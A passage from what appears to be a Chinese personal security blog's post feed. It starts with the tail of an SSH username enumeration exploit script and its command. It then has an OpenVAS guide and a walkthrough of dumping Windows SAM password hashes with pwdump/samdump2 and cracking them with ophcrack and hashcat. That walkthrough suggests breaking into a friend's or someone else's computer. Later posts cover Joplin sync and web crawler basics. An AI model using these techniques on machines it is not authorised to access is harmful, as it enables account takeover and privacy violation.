f.readlines())</span><br><span class="line">        f.close()</span><br><span class="line">        <span class="comment"># map usernames to their respective threads</span></span><br><span class="line">        pool = multiprocessing.Pool(args.threads)</span><br><span class="line">        results = pool.map(checkUsername, usernames)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> args.outputFile:</span><br><span class="line">                outputFile = open(args.outputFile, <span class="string">&quot;w&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> IOError:</span><br><span class="line">            print(<span class="string">&quot;[-] Cannot write to outputFile.&quot;</span>)</span><br><span class="line">            sys.exit(<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> args.outputFormat==<span class="string">&#x27;json&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> args.outputFile:</span><br><span class="line">                outputFile.writelines(exportJSON(results))</span><br><span class="line">                outputFile.close()</span><br><span class="line">                print(<span class="string">&quot;[+] Results successfully written to &quot;</span> + args.outputFile + <span class="string">&quot; in JSON form.&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(exportJSON(results))</span><br><span class="line">        <span class="keyword">elif</span> args.outputFormat==<span class="string">&#x27;csv&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> args.outputFile:</span><br><span class="line">                outputFile.writelines(exportCSV(results))</span><br><span class="line">                outputFile.close()</span><br><span class="line">                print(<span class="string">&quot;[+] Results successfully written to &quot;</span> + args.outputFile + <span class="string">&quot; in CSV form.&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(exportCSV(results))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> args.outputFile:</span><br><span class="line">                outputFile.writelines(exportList(results))</span><br><span class="line">                outputFile.close()</span><br><span class="line">                print(<span class="string">&quot;[+] Results successfully written to &quot;</span> + args.outputFile + <span class="string">&quot; in List form.&quot;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(exportList(results))</span><br><span class="line">    <span class="keyword">else</span>: <span class="comment"># no usernames passed in</span></span><br><span class="line">        print(<span class="string">&quot;[-] No usernames provided to check&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sshUsernameEnumExploit.py --port 指定的端口 --userList 指定的字典文件   目标ip</span><br></pre></td></tr></table></figure>
<p>可以看到已经枚举出来了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20200928090952.png"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>OpenVAS的使用</title>
    <url>/2020/12/15/OpenVAS%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="界面页面"><a href="#界面页面" class="headerlink" title="界面页面"></a>界面页面</h2><p>OpenVAS的配置的东西都在这个地方<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215143622.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215145408.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215150037.png"></p>
<h2 id="OpenVAS添加扫描配置"><a href="#OpenVAS添加扫描配置" class="headerlink" title="OpenVAS添加扫描配置"></a>OpenVAS添加扫描配置</h2><p>我们先进行扫描的配置</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215150340.png"></p>
<p>他默认已经配置好了几个<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215151713.png"></p>
<p>添加扫描配置<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215151839.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215152016.png"><br>编辑自己刚才创建的<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215152125.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215152523.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215153025.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215153044.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215153108.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215153128.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215153143.png"></p>
<p>选择好就可以保存了</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215153245.png"></p>
<p>可以看见自己配置的漏洞模块</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215153345.png"></p>
<h2 id="添加目标"><a href="#添加目标" class="headerlink" title="添加目标"></a>添加目标</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215153449.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215153507.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215154705.png"></p>
<h2 id="添加扫描任务"><a href="#添加扫描任务" class="headerlink" title="添加扫描任务"></a>添加扫描任务</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215154746.png"><br>添加新的扫描任务<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215154843.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215155348.png"></p>
<h2 id="开始扫描"><a href="#开始扫描" class="headerlink" title="开始扫描"></a>开始扫描</h2><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201215161317.png"></p>
]]></content>
      <categories>
        <category>黑客工具使用</category>
        <category>openvas</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>提取系统密码和破解</title>
    <url>/2020/11/12/Pwdump%E6%8F%90%E5%8F%96%E7%B3%BB%E7%BB%9F%E5%AF%86%E7%A0%81/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p><strong>现在不知道怎么回事有很多有很多的技术不分享，没有了黑客精神</strong><br><strong>下面大部分都是我自己花很长时间摸索出来的<br>ophcrack工具网上文章很少写,而且写的很不好一笔改过，下面我叫我摸索出来的全部写出来</strong><br><strong>有什么问题QQ2737977997</strong></p>
<h2 id="关于系统的密码保存"><a href="#关于系统的密码保存" class="headerlink" title="关于系统的密码保存"></a>关于系统的密码保存</h2><p>系统密码他不是用明文的方式进行保存的他被加密保存的<br>系统密码他会做哈希计算</p>
<p>当你登录操作系统的时候会有一个组件进行哈希计算，然后在和你的操作系统存储的密码哈希进行比较，对就进去不对就进不去</p>
<p>windows他的保存密码的密文在</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:\Windows\System32\config\SAM</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201109105542.png"></p>
<h2 id="Pwdump工具下载和使用读取系统密码的密文"><a href="#Pwdump工具下载和使用读取系统密码的密文" class="headerlink" title="Pwdump工具下载和使用读取系统密码的密文"></a>Pwdump工具下载和使用读取系统密码的密文</h2><h3 id="官方下载"><a href="#官方下载" class="headerlink" title="官方下载"></a>官方下载</h3><p>地址<a href="https://www.openwall.com/passwords/windows-pwdump">https://www.openwall.com/passwords/windows-pwdump</a><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201108194454.png"><br>文件内容<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201108194728.png"></p>
<h3 id="kali-自带的Pwdump"><a href="#kali-自带的Pwdump" class="headerlink" title="kali 自带的Pwdump"></a>kali 自带的Pwdump</h3><p>在kali目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;fgdump&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201109102245.png"></p>
<h2 id="Pwdump工具使用"><a href="#Pwdump工具使用" class="headerlink" title="Pwdump工具使用"></a>Pwdump工具使用</h2><p>kali自带的已经是很老的了只能在XP上使用，往下的演示都是用的官方下载的使用</p>
<h3 id="官方下载的使用"><a href="#官方下载的使用" class="headerlink" title="官方下载的使用"></a>官方下载的使用</h3><p>官方的很简单只需要在cmd里面输入他的名字回车就可以读取被加密的登录的密码</p>
<p>咧<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201109103237.png"><br>他的输出结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Administrator:500:B376BD7F4A9FAC0E685208F7B9C9C456:CFB952FF8FF4FEEF7256E10B33D9FE90:zb::</span><br><span class="line">Guest:501:********************************:********************************:::</span><br><span class="line">zhao:1002:6CD329177C7F01D76E2EA291666BA880:1F5637BCC9478F4857DFA71D8A0FA3B0:::   </span><br></pre></td></tr></table></figure>
<p>输出的内容介绍</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Administrator:500:B376BD7F4A9FAC0E685208F7B9C9C456:CFB952FF8FF4FEEF7256E10B33D9FE90:zb::</span><br></pre></td></tr></table></figure>
<p><code>Administrator</code>是管理员名<br><code>B376BD7F4A9FAC0E685208F7B9C9C456</code>是用<code>LM Hash</code>加密的<br><code>CFB952FF8FF4FEEF7256E10B33D9FE90</code>是用<code>NTLM Hash</code>加密的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Guest:501:********************************:********************************:::</span><br></pre></td></tr></table></figure>
<p><code>Guest</code>是管理员名<br><code>********************************</code>就是没有密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">zhao:1002:6CD329177C7F01D76E2EA291666BA880:1F5637BCC9478F4857DFA71D8A0FA3B0:::   </span><br></pre></td></tr></table></figure>
<p>和上面的<code>Administrator</code>一样就不接受了</p>
<h3 id="kali-自带的Pwdump使用"><a href="#kali-自带的Pwdump使用" class="headerlink" title="kali 自带的Pwdump使用"></a>kali 自带的Pwdump使用</h3><p>kali自带的已经是很老的了只能在XP上使用的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PwDump.exe localhost</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201109113930.png"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Administrator:500:3B7DF29913AF1E3825AD3B83FA6627C7:29580C14731A92096FBD58F1AD65E461:::</span><br><span class="line">ASPNET:1004:495589DD030276D171404F02A4778531:7E5D813CEE9EB72C714C051FEDDFE092:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">HelpAssistant:1000:C2F98081EFD7F47425A101959DC7654E:2B9D844A7F5FD5E676DFDA0CFE56A7D3:::</span><br><span class="line">SUPPORT_388945a0:1002:NO PASSWORD*********************:07D0790726BFFB96A7E72228920035A0:::</span><br></pre></td></tr></table></figure>
<h2 id="kali-自带的samdump2进行读取系统密码的密文"><a href="#kali-自带的samdump2进行读取系统密码的密文" class="headerlink" title="kali 自带的samdump2进行读取系统密码的密文"></a>kali 自带的samdump2进行读取系统密码的密文</h2><p>比如想破解朋友的电脑的密码就只需要自动U盘里面的kali就可以了<br>下面演示的是我的双系统kali提权win10里面的<br>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">samdump2 SYSTEM SAM -o &#x2F;root&#x2F;a.hash </span><br></pre></td></tr></table></figure>
<p>查看一下<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112154138.png"></p>
<h2 id="ophcrack工具破解密文"><a href="#ophcrack工具破解密文" class="headerlink" title="ophcrack工具破解密文"></a>ophcrack工具破解密文</h2><p>官方地址<a href="https://ophcrack.sourceforge.io/">https://ophcrack.sourceforge.io/</a></p>
<h3 id="工具介绍ophcrack"><a href="#工具介绍ophcrack" class="headerlink" title="工具介绍ophcrack"></a>工具介绍ophcrack</h3><p>他专用用于破解windows密码而设计的<br>他就支持<code>LM Hash</code>加密和<code>NTLM Hash</code>加密</p>
<h3 id="ophcrack在kali安装"><a href="#ophcrack在kali安装" class="headerlink" title="ophcrack在kali安装"></a>ophcrack在kali安装</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install ophcrack</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201109162322.png"></p>
<h3 id="官方安装"><a href="#官方安装" class="headerlink" title="官方安装"></a>官方安装</h3><p>官方地址<a href="https://ophcrack.sourceforge.io/">https://ophcrack.sourceforge.io/</a></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201109162803.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201109163327.png"></p>
<p>下载好解压出来<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201109163535.png"><br>安装<br>进入解压出来的目录<br>运行下面的命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;configure</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201109163634.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201109163803.png"></p>
<h3 id="下载彩虹表"><a href="#下载彩虹表" class="headerlink" title="下载彩虹表"></a>下载彩虹表</h3><p><a href="https://ophcrack.sourceforge.io/tables.php">https://ophcrack.sourceforge.io/tables.php</a><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201110115006.png"><br>下面这个是他使用的字符集<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201110191023.png"></p>
<h3 id="win7密码爆破"><a href="#win7密码爆破" class="headerlink" title="win7密码爆破"></a>win7密码爆破</h3><p><strong>测试就用上面读取出来的win7电脑的密文进行破解</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Administrator:500:3B7DF29913AF1E3825AD3B83FA6627C7:29580C14731A92096FBD58F1AD65E461:::</span><br><span class="line">ASPNET:1004:495589DD030276D171404F02A4778531:7E5D813CEE9EB72C714C051FEDDFE092:::</span><br><span class="line">Guest:501:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line">HelpAssistant:1000:C2F98081EFD7F47425A101959DC7654E:2B9D844A7F5FD5E676DFDA0CFE56A7D3:::</span><br><span class="line">SUPPORT_388945a0:1002:NO PASSWORD*********************:07D0790726BFFB96A7E72228920035A0:::</span><br></pre></td></tr></table></figure>
<p>叫文件放到一个<code>xxx.pwdump</code>文件里面<br>我在<code>a.pwdump</code>文件里面存放的内容<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201110113234.png"></p>
<p><strong>ophcrack导入a.pwdump</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201110113610.png"><br>选择要选择a.pwdump文件<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201110113643.png"><br>下面可以看到已经添加上面了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201110113744.png"></p>
<p>如果你想删除那个那就点住那个按Delete键<br>应为测试我就留一个<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201110114016.png"></p>
<p><strong>导入彩虹表</strong><br>我下载的彩虹表是<code>tables_vista_free.zip</code>和<code>vista_proba_free</code><br>然后解压出来<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201110114817.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201110115418.png"><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201110152942.png"></p>
<p>打开之后发现他绿了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201110153106.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201110154122.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201110185614.png"></p>
<p>点击这个开始爆破<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201110185711.png"><br>爆破出来了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201110191222.png"></p>
<h3 id="single-hash使用-指定单个爆破"><a href="#single-hash使用-指定单个爆破" class="headerlink" title="single hash使用(指定单个爆破)"></a>single hash使用(指定单个爆破)</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112112943.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112113716.png"><br>然后叫上面的我们提取出来的哈希值放入到里面<code>Administrator:500:3B7DF29913AF1E3825AD3B83FA6627C7:29580C14731A92096FBD58F1AD65E461:::</code></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112115730.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112115750.png"><br>什么那那个已经说了怎么导入彩虹表可以到上面去看看<br>我这导入了两个彩虹表<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112115900.png"><br>点击破解</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112120115.png"><br>破解出来了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112120015.png"></p>
<h3 id="PWDUMP-file和session-file-文件指定文件"><a href="#PWDUMP-file和session-file-文件指定文件" class="headerlink" title="PWDUMP file和session file(文件指定文件)"></a>PWDUMP file和session file(文件指定文件)</h3><p>这个使用在上面的基本使用说用过了<br>指定一个文件<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112141419.png"></p>
<h3 id="Encrypted-SAM使用"><a href="#Encrypted-SAM使用" class="headerlink" title="Encrypted SAM使用"></a>Encrypted SAM使用</h3><p>他会提取SAM文件文件里面的哈希值</p>
<h3 id="破解他人win10电脑密码"><a href="#破解他人win10电脑密码" class="headerlink" title="破解他人win10电脑密码"></a>破解他人win10电脑密码</h3><p>比如我们破解破解一个其他人的电脑密码我们就可以启动U盘里面的kali运行</p>
<p>进入系统后<br>打开ophcrack工具<br>点击这个<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112143744.png"></p>
<p>找到SAM文件在的文件夹<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112144026.png"><br>他就会自动读取<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112144124.png"></p>
<p>这个我就破解一个</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112144235.png"></p>
<h3 id="Local-SAM-witsamdump2-自动提取"><a href="#Local-SAM-witsamdump2-自动提取" class="headerlink" title="Local SAM witsamdump2(自动提取)"></a>Local SAM witsamdump2(自动提取)</h3><p>他要以管理员来运行才可以</p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112145250.png"><br>他就会自动寻找目录叫他会提取SAM文件文件里面的哈希值<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112145548.png"><br>破解出来了<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112151309.png"></p>
<h3 id="其他使用"><a href="#其他使用" class="headerlink" title="其他使用"></a>其他使用</h3><p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112151227.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112152243.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112152356.png"></p>
<h2 id="hashcat破解-NTLM密文"><a href="#hashcat破解-NTLM密文" class="headerlink" title="hashcat破解 NTLM密文"></a>hashcat破解 NTLM密文</h2><p>下面是上面提取出来的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Administrator:500:3B7DF29913AF1E3825AD3B83FA6627C7:29580C14731A92096FBD58F1AD65E461:::</span><br></pre></td></tr></table></figure>
<p><code>29580C14731A92096FBD58F1AD65E461</code>就是NTLM密文</p>
<p>命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -a 3 -m 1000 --force 29580C14731A92096FBD58F1AD65E461 &quot;?d?d?d?d?d?d?d?d&quot; </span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201112162036.png"></p>
]]></content>
      <categories>
        <category>密码破解</category>
      </categories>
      <tags>
        <tag>密码破解</tag>
      </tags>
  </entry>
  <entry>
    <title>Joplin同步坚果云</title>
    <url>/2020/12/23/Joplin%E5%90%8C%E6%AD%A5%E5%9D%9A%E6%9E%9C%E4%BA%91/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><strong>系统kali linux 环境kde</strong></p>
<h2 id="下载joplin"><a href="#下载joplin" class="headerlink" title="下载joplin"></a>下载joplin</h2><p>应为我用的是<code>kali linux</code>直接下载就可以了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apt install joplin</span><br></pre></td></tr></table></figure>
<h2 id="坚果云配置"><a href="#坚果云配置" class="headerlink" title="坚果云配置"></a>坚果云配置</h2><p>我创建一个文件<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201223113454.png"></p>
<p><strong>进入安全项</strong><br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201223111343.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201223111354.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201223112248.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201223112334.png"></p>
<h2 id="joplin"><a href="#joplin" class="headerlink" title="joplin"></a>joplin</h2><p><strong>生成三方应用密码</strong></p>
<p>开启同步<br><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201223111735.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201223111829.png"></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201223112704.png"><br>复制到下面就可以了<br>注意地址是这样的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;dav.jianguoyun.com&#x2F;dav&#x2F;这个是上面创建的文件名</span><br></pre></td></tr></table></figure>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wZass/zp/raw/master/img/20201223113750.png"></p>
]]></content>
      <categories>
        <category>搭建</category>
        <category>其他</category>
      </categories>
      <tags>
        <tag>搭建</tag>
      </tags>
  </entry>
  <entry>
    <title>Python爬虫2.基础</title>
    <url>/2021/01/18/Python%E7%88%AC%E8%99%AB2/</url>
    <content><![CDATA[<script src="/assets/js/DPlayer.min.js"> </script><p>看的书《Python3 网络爬虫开发实战教程》学习笔记</p>
<h1 id="URI和URL和URN"><a href="#URI和URL和URN" class="headerlink" title="URI和URL和URN"></a>URI和URL和URN</h1><p><strong>URI：</strong>Uniform Resource Identifier（统一资源标识符）<br><strong>URL：</strong>Uniform Resource Location（统一资源定位符）</p>
<p><strong>URN：</strong>Universal Resource Name（即统一资源名称）</p>
<p><strong>URL和URN 是 URI 的子集</strong></p>
<p><img src= "/img/loading2.gif" data-lazy-src="https://gitee.com/wzass/zp/raw/master/img/image-20210118141820803.png" alt="image-20210118141820803"></p>
<h2 id="URL统一资源定位符"><a href="#URL统一资源定位符" class="headerlink" title="URL统一资源定位符"></a>URL统一资源定位符</h2><p>书上说的可能难理解</p>
<p>简单说他一个常用的链接比如<code>https://www.baidu.com/a.png</code>他直接就定位到了百度的<code>a.png</code>照片</p>
<h2 id="URN即统一资源名称符"><a href="#URN即统一资源名称符" class="headerlink" title="URN即统一资源名称符"></a>URN即统一资源名称符</h2><p>书上说的可能难理解</p>
<p>什么是一个URN下面举例</p>
<p>还是一个百度的一个a.png照片文件，URL是这样的<code>https://www.baidu.com/a.png</code>，但是用URN可能就是<code>adsdasdascasda</code>了唯一的一个字符串，如果你访问这个字符串不管照片放到都可以访问到，在不知道<code>a.png</code>在那都可以用<code>adsdasdascasda</code>了唯一的一个字符串这个访问到<code>a.png</code>文件。</p>
<p>使用URN可以在不知道其网络位置及访问方式的情况下讨论资源</p>
<h2 id="URI统一资源标识符"><a href="#URI统一资源标识符" class="headerlink" title="URI统一资源标识符"></a>URI统一资源标识符</h2><p><strong>URL和URN 是 URI 的子集</strong></p>
<p>URN 用得非常少，所以几乎所有的 URI 都是 URL，一般的网页链接我们既可以称为 URL，也可以称为 URI</p>
<h1 id="超文本"><a href="#超文本" class="headerlink" title="超文本"></a>超文本</h1><p>而网页的源代码 HTML 就可以称作超文本</p>
<h1 id="http和https"><a href="#http和https" class="headerlink" title="http和https"></a>http和https</h1><p>我这个笔记有写</p>
<p><a href="https://www.zssnp.top/2020/01/20/http%E5%8D%8F%E8%AE%AE/">https://www.zssnp.top/2020/01/20/http%E5%8D%8F%E8%AE%AE/</a></p>
<h1 id="网页基础"><a href="#网页基础" class="headerlink" title="网页基础"></a>网页基础</h1><p>网站的构成就是有HTML、CSS 和 JavaScript构成的</p>
<p>这个学习过一点都知道，如果不知道的那爬虫就不用学习了，先学习web解一下在学习</p>
<h1 id="爬虫的基本原理"><a href="#爬虫的基本原理" class="headerlink" title="爬虫的基本原理"></a>爬虫的基本原理</h1><p>简单来说，爬虫就是获取网页并提取和保存信息的自动化程序</p>
<p>Python 提供了许多库来帮助我们实现这个操作，如 urllib、requests 等。我们可以用这些库来帮助我们实现 HTTP 请求操作</p>
<p>我们在用 urllib 或 requests 抓取网页时，得到的源代码实际和浏览器中看到的不一样</p>
<p>现在网页越来越多地采用 Ajax、前端模块化工具来构建，整个网页可能都是由 JavaScript 渲染出来的，也就是说原始的 HTML 代码就是一个空壳，</p>
<p>例如</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>This is a Demo<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;app.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="会话和-Cookies"><a href="#会话和-Cookies" class="headerlink" title="会话和 Cookies"></a>会话和 Cookies</h1><h2 id="静态网页和动态网页"><a href="#静态网页和动态网页" class="headerlink" title="静态网页和动态网页"></a>静态网页和动态网页</h2><h3 id="静态网页"><a href="#静态网页" class="headerlink" title="静态网页"></a>静态网页</h3><p>下面这个就是静态网页没有调用然后后端代码比如JSP、PHP、Python </p>
